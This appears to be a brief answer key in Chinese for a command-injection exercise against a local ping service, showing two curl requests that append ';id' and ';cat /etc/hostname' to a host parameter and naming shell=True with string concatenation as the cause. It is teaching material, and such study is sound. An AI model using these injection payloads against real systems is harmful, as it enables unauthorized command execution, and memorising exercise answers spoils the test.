### 答案

注入 payload 示例：
```
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"
curl "http://127.0.0.1:8087/?host=127.0.0.1;cat /etc/hostname"
```

这些命令会在 ping 后额外执行 id/ls 等系统命令。
根本原因：后端使用 shell=True + 字符串拼接。